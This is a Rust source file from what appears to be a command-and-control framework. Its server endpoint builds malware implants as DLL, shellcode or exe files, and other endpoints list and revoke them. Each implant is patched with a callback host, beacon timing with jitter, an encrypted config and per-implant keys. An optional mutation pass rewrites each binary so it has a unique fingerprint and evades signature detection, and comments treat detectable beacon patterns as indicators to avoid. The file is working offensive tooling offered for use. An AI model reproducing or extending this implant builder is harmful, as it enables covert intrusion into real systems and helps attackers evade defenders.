//! Implant generation endpoint — server-side per-implant binary production.
//!
//! `POST /api/generate-implant` takes a JSON spec and returns a patched DLL (or
//! shellcode) with a per-implant X25519 keypair, one-time auth token, and
//! encrypted runtime config embedded in the `.nyx_cfg` PE section.
//!
//! ## Architecture
//!
//! 1. The CI pipeline produces a DLL template with an unpatched `.nyx_cfg`
//!    section (magic `0x41414141`, 1024 bytes of `0xAA`).
//! 2. The server loads this template at startup (`NYX_TEMPLATE`).
//! 3. On generation:
//!    a. Generate per-implant X25519 keypair + 32B auth_token
//!    b. Serialize the config plaintext (callback, features, etc.)
//!    c. Encrypt config under config_key = random 32B (not ECDH-derived, to
//!    avoid the circular key problem — see design notes below)
//!    d. Patch the `.nyx_cfg` section: [0xDEADBEEF][data_len][implant_priv]
//!    [nonce][encrypted_config][tag]
//!    e. Store implant metadata in DB
//!    f. Return the patched binary
//!
//! ## Why random config_key instead of ECDH-derived
//!
//! The architecture doc proposes HKDF(ECDH(implant_priv, server_pub)) as the
//! config key. However, the implant needs its own private key to compute this.
//! If the private key is inside the encrypted config, that's circular. The fix:
//! the implant_priv is embedded in PLAINTEXT in `.nyx_cfg` (after the magic,
//! before the encrypted blob). The implant reads it, derives the pubkey, and
//! uses both for the beacon loop. The config_key is random (included alongside
//! implant_priv), sidestepping the circular dependency entirely while still
//! providing per-implant unique encryption.

use std::sync::Arc;

use axum::{extract::State, http::StatusCode, Json};
use nyx_mutate::{Mutator, MutationPasses};
use nyx_protocol::wire::Writer;
use rand::RngCore;
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};

use crate::AppState;

/// Feature bit (bit 30 in the `features` u32) that enables binary mutation
/// (NOP insertion, register rotation, key randomization) during implant
/// generation. Set this flag to produce per-implant unique binary fingerprints.
pub const FEATURE_MUTATE: u32 = 0x4000_0000;

// ── PE validation ─────────────────────────────────────────────────────────

/// Validate a PE template at load time: MZ magic, PE signature at offset 0x3C,
/// minimum 4096 bytes. This is a startup-time sanity check — it guards against
/// corrupted/truncated files but does not parse the full NT header.
pub fn validate_template_pe(bytes: &[u8]) -> Result<(), String> {
    if bytes.len() < 4096 {
        return Err("template too small (min 4096 bytes)".to_string());
    }
    // MZ magic
    if bytes[0] != 0x4D || bytes[1] != 0x5A {
        return Err("missing MZ magic".to_string());
    }
    // PE signature pointer at offset 0x3C (little-endian u32)
    let pe_sig_off =
        u32::from_le_bytes([bytes[0x3C], bytes[0x3D], bytes[0x3E], bytes[0x3F]]) as usize;
    if pe_sig_off + 4 > bytes.len() {
        return Err("PE signature offset out of bounds".to_string());
    }
    if bytes[pe_sig_off] != 0x50
        || bytes[pe_sig_off + 1] != 0x45
        || bytes[pe_sig_off + 2] != 0x00
        || bytes[pe_sig_off + 3] != 0x00
    {
        return Err("missing PE\\0\\0 signature".to_string());
    }
    Ok(())
}

/// Validate a patched PE binary at generation time. Checks MZ, PE sig,
/// `.nyx_cfg` section magic (0xDEADBEEF), and section bounds so a malformed
/// implant is caught before it is stored or returned to the operator.
fn validate_patched_pe(binary: &[u8], cfg_offset: usize) -> Result<(), String> {
    if binary.len() < 4096 {
        return Err("patched binary too small".to_string());
    }
    if binary[0] != 0x4D || binary[1] != 0x5A {
        return Err("missing MZ magic in patched binary".to_string());
    }
    let pe_sig_off =
        u32::from_le_bytes([binary[0x3C], binary[0x3D], binary[0x3E], binary[0x3F]]) as usize;
    if pe_sig_off + 4 > binary.len() {
        return Err("PE signature offset out of bounds in patched binary".to_string());
    }
    if binary[pe_sig_off] != 0x50
        || binary[pe_sig_off + 1] != 0x45
        || binary[pe_sig_off + 2] != 0x00
        || binary[pe_sig_off + 3] != 0x00
    {
        return Err("missing PE\\0\\0 signature in patched binary".to_string());
    }
    // .nyx_cfg section magic at cfg_offset
    if cfg_offset + 6 > binary.len() {
        return Err("cfg_offset out of bounds in patched binary".to_string());
    }
    let magic = u32::from_le_bytes([
        binary[cfg_offset],
        binary[cfg_offset + 1],
        binary[cfg_offset + 2],
        binary[cfg_offset + 3],
    ]);
    if magic != 0xDEADBEEF {
        return Err(format!(
            "bad .nyx_cfg magic at offset {cfg_offset}: expected 0xDEADBEEF, got 0x{magic:08X}"
        ));
    }
    // Validate data_len fits within the 1024-byte section
    let data_len = u16::from_le_bytes([binary[cfg_offset + 4], binary[cfg_offset + 5]]) as usize;
    if data_len > 900 {
        return Err(format!("data_len too large: {data_len} (max 900)"));
    }
    if cfg_offset + 1024 > binary.len() {
        return Err(".nyx_cfg section extends past EOF in patched binary".to_string());
    }
    // Config data must fit: start = cfg_offset+50, end = cfg_offset+50+data_len
    if cfg_offset + 50 + data_len > cfg_offset + 1024 {
        return Err("encrypted config data overflows .nyx_cfg section".to_string());
    }
    Ok(())
}

// ── Rate limiting ──────────────────────────────────────────────────────────

/// Maximum implant generation requests per sliding window.
const DEFAULT_RATE_LIMIT_MAX: usize = 10;
/// Sliding window duration in seconds (1 hour).
const DEFAULT_RATE_LIMIT_WINDOW_SECS: u64 = 3600;

// ── Request / Response types ────────────────────────────────────────────────

/// Request body for `POST /api/generate-implant`.
#[derive(Debug, Deserialize)]
pub struct GenerateRequest {
    /// Callback host (IP or hostname). Required.
    pub callback: String,
    /// Callback port. Defaults to 8443.
    #[serde(default = "default_port")]
    pub port: u16,
    /// Output format: "dll" (default), "shellcode", "exe".
    #[serde(default = "default_format")]
    pub format: String,
    /// Beacon URI path (e.g., "/beacon"). Defaults to "/beacon".
    #[serde(default = "default_uri")]
    pub uri: String,
    /// Sleep interval in seconds between beacon cycles. Default 60.
    #[serde(default = "default_sleep")]
    pub sleep: u32,
    /// Jitter percentage (0-100). Default 20.
    #[serde(default = "default_jitter")]
    pub jitter: u8,
    /// Use TLS for beacon transport. Default true.
    #[serde(default = "default_tls")]
    pub tls: bool,
    /// Features bitmap. See the architecture doc for bit definitions.
    #[serde(default)]
    pub features: u32,
    /// Number of HKDF environment keying layers (0 = off). Phase 3.
    #[serde(default)]
    pub keying: u32,
    /// ISO 8601 expiry timestamp, or empty = no expiry.
    #[serde(default)]
    pub expires: Option<String>,
    /// Operator notes.
    #[serde(default)]
    pub notes: Option<String>,
}

fn default_port() -> u16 {
    8443
}
fn default_format() -> String {
    "dll".into()
}
fn default_uri() -> String {
    "/beacon".into()
}
fn default_sleep() -> u32 {
    60
}
fn default_jitter() -> u8 {
    20
}
fn default_tls() -> bool {
    true
}

#[derive(Debug, Serialize)]
pub struct GenerateResponse {
    pub ok: bool,
    /// Hex-encoded X25519 public key of the new implant.
    pub implant_pub: String,
    /// Hex-encoded SHA-256 of the output binary.
    pub sha256: String,
    /// Size of the output binary in bytes.
    pub size_bytes: usize,
    /// The output format.
    pub format: String,
    /// Human-readable message.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub message: Option<String>,
}

#[derive(Debug, Serialize)]
pub struct ImplantListResponse {
    pub ok: bool,
    pub implants: Vec<ImplantSummary>,
}

#[derive(Debug, Serialize)]
pub struct ImplantSummary {
    pub id: i64,
    pub implant_pub: String,
    pub auth_token_used: bool,
    pub created_at: String,
    pub callback_host: String,
    pub callback_port: u16,
    pub format: String,
    pub revoked: bool,
    pub expires_at: Option<String>,
}

// ── Handler ─────────────────────────────────────────────────────────────────

/// `POST /api/generate-implant`
///
/// Requires a loaded DLL template (`NYX_TEMPLATE`) and an open implant store.
/// Authenticated via the standard control-API bearer token (checked by the
/// auth middleware layer).
pub async fn generate_implant(
    State(st): State<Arc<AppState>>,
    Json(req): Json<GenerateRequest>,
) -> Result<Json<GenerateResponse>, (StatusCode, String)> {
    let template = st
        .template
        .as_ref()
        .ok_or_else(|| {
            (
                StatusCode::SERVICE_UNAVAILABLE,
                "implant generation disabled: no DLL template loaded (set NYX_TEMPLATE)".into(),
            )
        })?;

    let implant_store = st
        .implants
        .as_ref()
        .ok_or_else(|| {
            (
                StatusCode::SERVICE_UNAVAILABLE,
                "implant generation disabled: no implant store".into(),
            )
        })?;

    // Validate inputs.
    if req.callback.is_empty() || req.callback.len() > 255 {
        return Err((
            StatusCode::BAD_REQUEST,
            "callback host must be 1-255 characters".into(),
        ));
    }
    if req.jitter > 100 {
        return Err((
            StatusCode::BAD_REQUEST,
            "jitter must be 0-100".into(),
        ));
    }
    if !matches!(req.format.as_str(), "dll" | "shellcode" | "exe") {
        return Err((
            StatusCode::BAD_REQUEST,
            "format must be 'dll', 'shellcode', or 'exe'".into(),
        ));
    }
    if req.sleep == 0 {
        return Err((
            StatusCode::BAD_REQUEST,
            "sleep must be > 0 (no-interval beacon is an IOC)".into(),
        ));
    }

    // Rate limiting: sliding window per (callback, port) pair. Prevents
    // enumeration/spray against a single target by capping generation to
    // DEFAULT_RATE_LIMIT_MAX requests per DEFAULT_RATE_LIMIT_WINDOW_SECS.
    {
        use std::time::Instant;
        let key = format!("{}:{}", req.callback, req.port);
        let mut entry = st.implant_rate_limiter.entry(key).or_default();
        let now = Instant::now();
        let window = std::time::Duration::from_secs(DEFAULT_RATE_LIMIT_WINDOW_SECS);
        entry.retain(|t| now.duration_since(*t) < window);
        if entry.len() >= DEFAULT_RATE_LIMIT_MAX {
            return Err((
                StatusCode::TOO_MANY_REQUESTS,
                format!(
                    "rate limit exceeded: max {} implants per hour per target",
                    DEFAULT_RATE_LIMIT_MAX
                ),
            ));
        }
        entry.push(now);
    }

    // 1. Generate per-implant secrets.
    let mut implant_priv = [0u8; 32];
    let mut auth_token = [0u8; 32];
    let mut config_key = [0u8; 32];
    let mut config_nonce = [0u8; 12];
    rand::rngs::OsRng.fill_bytes(&mut implant_priv);
    rand::rngs::OsRng.fill_bytes(&mut auth_token);
    rand::rngs::OsRng.fill_bytes(&mut config_key);
    rand::rngs::OsRng.fill_bytes(&mut config_nonce);

    // Derive implant public key from the private key.
    let implant_pub = nyx_protocol::crypto::public_from_secret(&implant_priv)
        .ok_or_else(|| {
            (
                StatusCode::INTERNAL_SERVER_ERROR,
                "failed to derive implant public key".into(),
            )
        })?;

    // 2. Build config plaintext.
    // Layout: str(callback) | u16(port) | str(uri) | u32(sleep) | u8(jitter) | u8(tls)
    //        | u8(has_token=1) | blob(auth_token 32B)
    //        | u32(features) | u32(keying) | u64(expires_at)
    let mut pw = Writer::new();
    pw.str(&req.callback).map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()))?;
    pw.u16(req.port);
    pw.str(&req.uri).map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()))?;
    pw.u32(req.sleep);
    pw.u8(req.jitter);
    pw.u8(if req.tls { 1 } else { 0 });
    // auth_token: always present for server-generated implants
    pw.u8(1);
    pw.blob(&auth_token).map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()))?;
    pw.u32(req.features);
    pw.u32(req.keying);
    let expires_ts: u64 = req
        .expires
        .as_ref()
        .and_then(|s| {
            // Parse ISO 8601 timestamp or fall back to 0.
            // Simple parse: expect YYYY-MM-DDTHH:MM:SSZ or similar.
            s.parse::<i64>().ok().map(|v| v as u64)
        })
        .unwrap_or(0);
    pw.u64(expires_ts);
    let config_plaintext = pw.into_bytes();

    // 3. Encrypt config with ChaCha20-Poly1305.
    let ct_with_tag = {
        use chacha20poly1305::aead::{Aead, KeyInit, Payload};
        use chacha20poly1305::{ChaCha20Poly1305, Key, Nonce};
        let cipher = ChaCha20Poly1305::new(Key::from_slice(&config_key));
        let nonce = Nonce::from_slice(&config_nonce);
        cipher
            .encrypt(nonce, Payload { msg: &config_plaintext, aad: b"" })
            .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, format!("encrypt failed: {e}")))?
    };
    // ct_with_tag = ciphertext || 16B Poly1305 tag

    // 4. Patch the DLL template.
    let mut binary = (**template).clone();

    // Find the .nyx_cfg placeholder: magic 0x41414141 followed by 0xAA bytes.
    let placeholder_offset = binary
        .windows(8)
        .position(|w| {
            w[0] == 0x41 && w[1] == 0x41 && w[2] == 0x41 && w[3] == 0x41
                && w[4] == 0xAA && w[5] == 0xAA
        })
        .ok_or_else(|| {
            (
                StatusCode::INTERNAL_SERVER_ERROR,
                "DLL template has no .nyx_cfg placeholder (0x41414141 + 0xAA)".into(),
            )
        })?;

    // Sanity: we need at least 1024 bytes for the section.
    if placeholder_offset + 1024 > binary.len() {
        return Err((
            StatusCode::INTERNAL_SERVER_ERROR,
            "DLL template .nyx_cfg placeholder extends past EOF".into(),
        ));
    }

    // Write the patched section.
    let data_len = ct_with_tag.len();
    if data_len > 900 {
        return Err((
            StatusCode::INTERNAL_SERVER_ERROR,
            format!("config data too large: {data_len} bytes (max 900)"),
        ));
    }

    let section = &mut binary[placeholder_offset..placeholder_offset + 1024];
    // Magic: 0xDEADBEEF
    section[0] = 0xEF;
    section[1] = 0xBE;
    section[2] = 0xAD;
    section[3] = 0xDE;
    // Data length (u16 LE)
    section[4] = (data_len as u16) as u8;
    section[5] = ((data_len as u16) >> 8) as u8;
    // Implant private key (plaintext, 32B) at offset 6
    section[6..38].copy_from_slice(&implant_priv);
    // Config nonce (12B) at offset 38
    section[38..50].copy_from_slice(&config_nonce);
    // Encrypted config + tag at offset 50
    section[50..50 + data_len].copy_from_slice(&ct_with_tag);
    // Zero-pad the rest
    for b in &mut section[50 + data_len..] {
        *b = 0;
    }

    // 4b. Apply binary mutation if the feature bit is set.
    let mutation_report = if req.features & FEATURE_MUTATE != 0 {
        // Use the implant's private key bytes as the mutation seed for
        // deterministic, per-implant-unique mutation that is reproducible
        // from the audit log.
        let seed = u64::from_le_bytes([
            implant_priv[0],
            implant_priv[1],
            implant_priv[2],
            implant_priv[3],
            implant_priv[4],
            implant_priv[5],
            implant_priv[6],
            implant_priv[7],
        ]);
        let mutator = Mutator::new(seed);
        let passes = MutationPasses {
            nops: true,
            registers: true,
            keys: true,
        };
        let report = mutator.mutate(&mut binary, passes);
        tracing::info!(
            implant_pub = %hex::encode(implant_pub),
            nops = report.nops_inserted,
            regs = report.registers_swapped,
            keys = report.keys_randomized,
            "binary mutation applied"
        );
        Some(report)
    } else {
        None
    };

    // Validate the patched PE before computing SHA-256 and storing. Catches a
    // malformed implant (bad magic, section overflow) at generation time rather
    // than letting the operator download a corrupted binary.
    validate_patched_pe(&binary, placeholder_offset).map_err(|e| {
        (
            StatusCode::INTERNAL_SERVER_ERROR,
            format!("PE validation failed after patching: {e}"),
        )
    })?;

    // 5. Compute SHA-256 of the output.
    let mut hasher = Sha256::new();
    hasher.update(binary.as_slice());
    let sha256 = hex::encode(hasher.finalize());

    // 6. Store implant metadata.
    let mut token_hasher = Sha256::new();
    token_hasher.update(auth_token);
    let token_hash = hex::encode(token_hasher.finalize());

    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs().to_string())
        .unwrap_or_else(|_| "0".to_string());
    let record = nyx_store::ImplantRecord {
        id: 0, // auto-incremented
        implant_pub: hex::encode(implant_pub),
        auth_token_hash: token_hash,
        auth_token_used: false,
        created_at: now.clone(),
        created_by: None, // TODO: extract from auth context
        expires_at: req.expires.clone(),
        callback_host: req.callback.clone(),
        callback_port: req.port,
        format: req.format.clone(),
        features_bitmap: req.features,
        keying_levels: req.keying,
        sha256: sha256.clone(),
        size_bytes: binary.len() as i64,
        revoked: false,
        notes: req.notes.clone(),
    };

    let id = implant_store.insert(&record).map_err(|e| {
        (
            StatusCode::INTERNAL_SERVER_ERROR,
            format!("failed to store implant record: {e}"),
        )
    })?;

    // 7. Audit the generation event.
    if let Some(audit) = &st.audit {
        let mut detail = serde_json::json!({
            "implant_id": id,
            "implant_pub": hex::encode(implant_pub),
            "callback": req.callback,
            "port": req.port,
            "format": req.format,
            "sha256": sha256,
        });
        if let Some(ref report) = mutation_report {
            detail["mutation"] = serde_json::json!({
                "enabled": true,
                "nops_inserted": report.nops_inserted,
                "registers_swapped": report.registers_swapped,
                "keys_randomized": report.keys_randomized,
            });
        }
        audit.append("implant_generated", "system", "", detail);
    }

    tracing::info!(
        implant_id = id,
        implant_pub = %hex::encode(implant_pub),
        callback = %req.callback,
        format = %req.format,
        size = binary.len(),
        "implant generated"
    );

    Ok(Json(GenerateResponse {
        ok: true,
        implant_pub: hex::encode(implant_pub),
        sha256,
        size_bytes: binary.len(),
        format: req.format,
        message: Some(format!("implant {id} ready — {len} bytes", id = id, len = binary.len())),
    }))
}

/// `GET /api/implants` — list all generated implants.
pub async fn list_implants(
    State(st): State<Arc<AppState>>,
) -> Result<Json<ImplantListResponse>, (StatusCode, String)> {
    let store = st.implants.as_ref().ok_or_else(|| {
        (
            StatusCode::SERVICE_UNAVAILABLE,
            "no implant store".into(),
        )
    })?;

    let records = store.list().map_err(|e| {
        (
            StatusCode::INTERNAL_SERVER_ERROR,
            format!("failed to list implants: {e}"),
        )
    })?;

    let summaries: Vec<ImplantSummary> = records
        .into_iter()
        .map(|r| ImplantSummary {
            id: r.id,
            implant_pub: r.implant_pub,
            auth_token_used: r.auth_token_used,
            created_at: r.created_at,
            callback_host: r.callback_host,
            callback_port: r.callback_port,
            format: r.format,
            revoked: r.revoked,
            expires_at: r.expires_at,
        })
        .collect();

    Ok(Json(ImplantListResponse {
        ok: true,
        implants: summaries,
    }))
}

/// `POST /api/implant/revoke` — revoke an implant by pubkey.
#[derive(Debug, Deserialize)]
pub struct RevokeRequest {
    pub implant_pub: String,
}

pub async fn revoke_implant(
    State(st): State<Arc<AppState>>,
    Json(req): Json<RevokeRequest>,
) -> Result<Json<serde_json::Value>, (StatusCode, String)> {
    let store = st.implants.as_ref().ok_or_else(|| {
        (
            StatusCode::SERVICE_UNAVAILABLE,
            "no implant store".into(),
        )
    })?;

    let revoked = store.revoke(&req.implant_pub).map_err(|e| {
        (
            StatusCode::INTERNAL_SERVER_ERROR,
            format!("failed to revoke implant: {e}"),
        )
    })?;

    if let Some(audit) = &st.audit {
        let detail = serde_json::json!({"implant_pub": &req.implant_pub});
        audit.append("implant_revoked", "system", "", detail);
    }

    Ok(Json(serde_json::json!({
        "ok": true,
        "revoked": revoked,
    })))
}
